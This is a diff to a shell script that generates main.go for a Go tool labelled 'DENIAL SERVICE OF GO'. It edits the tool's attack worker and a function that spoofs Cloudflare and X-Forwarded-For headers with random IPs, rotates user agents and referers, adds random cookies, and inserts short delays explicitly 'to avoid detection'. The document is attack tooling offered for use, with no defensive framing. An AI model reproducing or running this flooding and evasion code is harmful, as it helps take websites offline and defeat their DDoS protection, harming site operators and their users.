@@ -23,7 +23,10 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (FINAL FIXED VERSION)
+# Remove any existing main.go to ensure clean slate
+rm -f main.go
+
+# Create main.go file directly (COMPLETE FIXED VERSION - NO UNUSED IMPORTS)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -385,14 +388,11 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR"}
 	
-	// Cloudflare specific headers
 	req.Header.Set("CF-Connecting-IP", spoofIP)
 	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
 	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
 	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
 	req.Header.Set("CDN-Loop", "cloudflare")
-	
-	// IP spoofing headers
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Forwarded-Proto", "https")
 	req.Header.Set("X-Real-IP", spoofIP)
@@ -401,10 +401,6 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("X-Remote-IP", spoofIP)
 	req.Header.Set("X-Remote-Addr", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
-	
-	// Additional spoofing headers
-	req.Header.Set("X-Host", req.Host)
-	req.Header.Set("X-Forwarded-Host", req.Host)
 }
 
 func main() {
@@ -595,7 +591,6 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				continue
 			}
 
-			// Set standard headers
 			req.Header.Set("User-Agent", randomUA())
 			req.Header.Set("Referer", randomReferer())
 			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
@@ -606,10 +601,8 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Upgrade-Insecure-Requests", "1")
 			req.Header.Set("DNT", "1")
 			
-			// Add Cloudflare bypass and IP spoofing headers
 			addCloudflareBypassHeaders(req)
 
-			// Add cookies
 			if randInt(1, 100) <= 50 {
 				cookies := generateCookies()
 				if cookies != "" {
@@ -617,7 +610,6 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				}
 			}
 
-			// Add random delay to avoid detection
 			if randInt(1, 100) <= 5 {
 				time.Sleep(time.Duration(randInt(1, 3)) * time.Millisecond)
 			}
